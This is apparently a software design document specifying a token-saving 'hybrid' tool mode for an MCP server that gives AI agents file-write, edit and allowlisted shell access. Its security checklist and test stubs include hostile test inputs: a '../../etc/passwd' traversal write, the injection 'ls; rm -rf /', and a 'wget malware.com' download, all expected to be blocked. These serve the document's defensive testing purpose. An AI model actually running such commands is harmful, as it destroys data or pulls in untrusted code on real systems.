# SDD: MCP Hybrid Bootstrap Mode

**Version:** 1.0  
**Date:** 2025-12-15  
**Status:** Ready for Implementation  
**Priority:** P0  
**Estimated Effort:** 4-8 hours  

---

## 1. Executive Summary

LLMC's MCP server currently has two modes with an unsustainable tradeoff:

| Mode | Token Overhead | Write Capability | Isolation Required |
|------|---------------|------------------|-------------------|
| Classic | ~41KB (10,250 tokens) | ✅ Full | No |
| Code Execution | ~4KB (1,000 tokens) | ❌ Blocked | Yes (Docker/K8s) |

**Solution:** Implement **Hybrid Mode** - a third mode that achieves **~90% token reduction** while preserving **100% write capability** without container isolation.

**Key Insight:** Write operations (`linux_fs_write`, `linux_fs_edit`, `run_cmd`) are *structurally bounded* operations, not arbitrary code execution. They can be secured with application-level controls (path validation, allowlists) without sandbox isolation.

---

## 2. Research Summary

Based on prior research in:
- `DOCS/legacy/research/Researching MCP Hybrid Bootstrap Mode.odt`
- `DOCS/legacy/research/Enabling Hybrid Bootstrap Mode in LLMC MCP.odt`

### 2.1 Token Analysis (RQ2)

| Tool Set | Characters | ~Tokens | Reduction |
|----------|------------|---------|-----------|
| Classic (23 tools) | ~41,000 | ~10,250 | Baseline |
| Code Exec (3 tools) | ~4,000 | ~1,000 | 90% |
| **Hybrid (6 tools)** | ~4,100 | ~1,025 | **90%** |

**Hybrid Bootstrap Set (6 tools):**
1. `read_file` (~400 chars) - Navigation
2. `list_dir` (~350 chars) - Navigation
3. `linux_fs_write` (~600 chars) - Write
4. `linux_fs_edit` (~1,200 chars) - Surgical edit
5. `run_cmd` (~700 chars) - Shell access
6. `execute_code` (~850 chars) - Complex computation (still isolation-gated)

### 2.2 Security Analysis (RQ3)

| Tool | Protection Mechanism | Status |
|------|---------------------|--------|
| `linux_fs_write` | `allowed_roots` + `pathlib.is_relative_to()` | ✅ Verified |
| `linux_fs_edit` | `allowed_roots` + `pathlib.is_relative_to()` | ✅ Verified |
| `run_cmd` | `run_cmd_allowlist` + `shell=False` | ✅ Verified |
| `execute_code` | `require_isolation()` | ✅ Keep as-is |

**Critical Security Requirements:**
1. Path validation MUST use `pathlib.Path.resolve().is_relative_to(root)`
2. Shell execution MUST use `subprocess.run(..., shell=False)`
3. `execute_code` MUST retain isolation requirement (no change)

### 2.3 Failure Modes (RQ5)

| Failure | Cause | Mitigation |
|---------|-------|------------|
| Sandbox Confusion | Agent uses `execute_code` to write files | Prompt explicitly warns about sandbox ephemeral files |
| Phantom Tool | Config lists tool without registered handler | Validation at startup, log warning |
| Context Blowout | Too many tools added over time | Bootstrap budget check (<15KB warning) |

---

## 3. Implementation Specification

### 3.1 Configuration Schema (`llmc.toml`)

```toml
[mcp]
# NEW: Mode selector - 'classic' | 'hybrid' | 'code_execution'
mode = "hybrid"  # Default to hybrid for new installs

[mcp.hybrid]
# Explicitly define which tools are promoted beyond read/list
# Default set provides write capability without full classic bloat
promoted_tools = ["linux_fs_write", "linux_fs_edit", "run_cmd"]

# Optional: Include execute_code for complex computation (requires isolation)
include_execute_code = true

# Budget warning threshold (characters)
bootstrap_budget_warning = 15000
```

### 3.2 Server Initialization (`llmc_mcp/server.py`)

**New function:** `_init_hybrid_mode()`

```python
def _init_hybrid_mode(self):
    """
    Initialize hybrid mode - bootstrap tools + promoted write tools.
    
    Achieves ~90% token reduction vs classic while preserving write capability.
    No sandbox isolation required (uses application-level security).
    """
    # Base bootstrap (always included)
    base_tools = {"read_file", "list_dir"}
    
    # Promoted tools from config (write capability)
    promoted = set(self.config.hybrid.promoted_tools)
    # Default: ["linux_fs_write", "linux_fs_edit", "run_cmd"]
    
    # Optional execute_code (still requires isolation)
    if self.config.hybrid.include_execute_code:
        promoted.add("execute_code")
    
    # Always include bootstrap tool
    all_tools = base_tools | promoted
    
    # Filter TOOLS list to only include selected tools
    self.tools = [t for t in TOOLS if t.name in all_tools]
    
    # Add bootstrap instruction tool
    self.tools.append(BOOTSTRAP_TOOL)
    
    # Register handlers for all enabled tools
    self.tool_handlers = {}
    for tool_name in all_tools:
        handler = self._get_handler_for_tool(tool_name)
        if handler:
            self.tool_handlers[tool_name] = handler
        else:
            logger.warning(f"No handler for tool '{tool_name}' - skipping")
    
    # Add bootstrap handler
    self.tool_handlers["00_INIT"] = self._handle_bootstrap
    
    # Bootstrap budget check
    total_chars = sum(len(json.dumps(t.inputSchema)) for t in self.tools)
    if total_chars > self.config.hybrid.bootstrap_budget_warning:
        logger.warning(
            f"Bootstrap toolset exceeds recommended size ({total_chars} chars > "
            f"{self.config.hybrid.bootstrap_budget_warning}). Consider removing tools."
        )
    
    logger.info(f"Hybrid mode: {len(self.tools)} tools registered ({total_chars} chars)")


def _get_handler_for_tool(self, tool_name: str) -> Callable | None:
    """Centralized handler registry for all tools."""
    HANDLER_REGISTRY = {
        # Navigation (always safe)
        "read_file": self._handle_read_file,
        "list_dir": self._handle_list_dir,
        "stat": self._handle_stat,
        
        # Write tools (secured by allowed_roots)
        "linux_fs_write": self._handle_fs_write,
        "linux_fs_edit": self._handle_fs_edit,
        "linux_fs_mkdir": self._handle_fs_mkdir,
        "linux_fs_move": self._handle_fs_move,
        "linux_fs_delete": self._handle_fs_delete,
        
        # Shell (secured by allowlist)
        "run_cmd": self._handle_run_cmd,
        
        # Code exec (isolation-gated)
        "execute_code": self._handle_execute_code,
        
        # RAG (read-only, safe)
        "rag_search": self._handle_rag_search,
        "rag_search_enriched": self._handle_rag_search_enriched,
        "rag_where_used": self._handle_rag_where_used,
        "rag_lineage": self._handle_rag_lineage,
        "inspect": self._handle_inspect,
        "rag_stats": self._handle_rag_stats,
        "rag_plan": self._handle_rag_plan,
        
        # ... other handlers
    }
    return HANDLER_REGISTRY.get(tool_name)
```

### 3.3 Mode Selection (`__init__`)

Update `__init__` in `LlmcMcpServer`:

```python
def __init__(self, config: McpConfig):
    self.config = config
    self.server = Server("llmc-mcp", instructions=BOOTSTRAP_PROMPT)
    self.obs = ObservabilityContext(config.observability)
    
    # Mode selection (ternary)
    mode = getattr(config, 'mode', None) or 'classic'
    
    if mode == 'hybrid':
        self._init_hybrid_mode()
    elif config.code_execution.enabled:
        self._init_code_execution_mode()
    else:
        self._init_classic_mode()
    
    self._register_dynamic_executables()
    self._register_handlers()
    logger.info(f"LLMC MCP Server initialized ({config.config_version}, mode={mode})")
```

### 3.4 Bootstrap Prompt Update (`prompts.py`)

Add hybrid-specific prompt section:

```python
HYBRID_MODE_PROMPT = """
## Operating Mode: Hybrid

You have a focused toolset for efficient development:

### Direct Tools (Host Filesystem)
- `linux_fs_write` - Create/overwrite files in the project
- `linux_fs_edit` - Surgical find/replace edits (token-efficient for large files)
- `run_cmd` - Shell commands (ls, grep, git, etc.) with allowlist

### Code Execution (Sandbox)
- `execute_code` - Complex computation, data processing
  ⚠️ WARNING: Files written via Python code are ephemeral!
  Pattern: Calculate in sandbox → persist via `linux_fs_write`

### Navigation
- `read_file` / `list_dir` - Browse the codebase

This mode achieves 90% token reduction vs full tool exposure.
"""
```

### 3.5 Config Model Update (`config.py`)

```python
@dataclass
class HybridConfig:
    promoted_tools: list[str] = field(default_factory=lambda: [
        "linux_fs_write", "linux_fs_edit", "run_cmd"
    ])
    include_execute_code: bool = True
    bootstrap_budget_warning: int = 15000


@dataclass
class McpConfig:
    # Existing fields...
    mode: str = "classic"  # 'classic' | 'hybrid' | 'code_execution'
    hybrid: HybridConfig = field(default_factory=HybridConfig)
```

---

## 4. Security Verification Checklist

Before enabling hybrid mode:

- [ ] **Path Traversal Test:** `linux_fs_write(path="../../etc/passwd")` → `PermissionError`
- [ ] **Shell Injection Test:** `run_cmd("ls; rm -rf /")` → Safe failure (no rm executed)
- [ ] **Allowlist Test:** `run_cmd("wget malware.com")` → Blocked (wget not in allowlist)
- [ ] **MAASL Test:** Concurrent writes to same file → Properly locked
- [ ] **execute_code Isolation:** Still requires `LLMC_ISOLATED=1` or container

---

## 5. Migration Path

### For Existing Users

1. **No action required** - Default remains `mode = "classic"` for existing configs
2. **Opt-in migration:** Add `mode = "hybrid"` to `[mcp]` section
3. **Validation:** Run `llmc repo validate` after change

### For New Installs

Consider making `hybrid` the default for new `llmc.toml` templates.

---

## 6. Test Plan

### Unit Tests

```python
def test_hybrid_mode_tool_count():
    """Hybrid mode should register exactly 6-7 tools."""
    config = McpConfig(mode="hybrid")
    server = LlmcMcpServer(config)
    assert len(server.tools) <= 7  # base + promoted + bootstrap

def test_hybrid_mode_write_works():
    """Write tools should function without isolation."""
    # ... write file, verify on disk

def test_hybrid_mode_execute_code_blocked():
    """execute_code should still require isolation."""
    # ... call execute_code, expect isolation error

def test_path_traversal_blocked():
    """Path traversal attempts should fail."""
    # ... attempt ../../../etc/passwd write

def test_shell_injection_blocked():
    """Shell injection should be safely neutralized."""
    # ... run_cmd("ls; rm -rf /")
```

### Integration Tests

```bash
# Start server in hybrid mode
python -m llmc_mcp.server --mode hybrid

# Verify tool list (should be ~6 tools)
echo '{"jsonrpc":"2.0","method":"tools/list","id":1}' | python -m llmc_mcp.server

# Test write capability
echo '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"linux_fs_write","arguments":{"path":"test.txt","content":"hello"}},"id":2}' | python -m llmc_mcp.server
```

---

## 7. Success Criteria

| Metric | Target | How to Verify |
|--------|--------|---------------|
| Token overhead | <5KB | Measure serialized tool schemas |
| Write capability | 100% | Create/edit files via MCP |
| Security | No regressions | Pass all security tests |
| Backward compat | 100% | Classic mode unchanged |

---

## 8. Implementation Order

1. **Config schema update** (30 min) - Add `mode` and `[mcp.hybrid]` section
2. **Handler registry refactor** (1 hr) - `_get_handler_for_tool()` centralization
3. **`_init_hybrid_mode()` implementation** (1 hr) - Core mode logic
4. **Mode selection in `__init__`** (15 min) - Ternary dispatch
5. **Prompt update** (30 min) - Hybrid-specific instructions
6. **Security tests** (1 hr) - Path traversal, shell injection
7. **Integration tests** (1 hr) - End-to-end MCP flow
8. **Documentation** (30 min) - User guide, changelog

**Total:** ~6 hours

---

## 9. References

- Anthropic: [Code execution with MCP](https://www.anthropic.com/engineering/code-execution-with-mcp)
- LLMC AAR: `DOCS/planning/legacy/AAR_MCP_WRITE_CAPABILITY_GAP.md`
- Security Audit: `tests/security/REPORTS/2025-12-14_Security_Audit.md`
- Prior Research: `DOCS/legacy/research/Researching MCP Hybrid Bootstrap Mode.odt`

---

**END OF SDD**
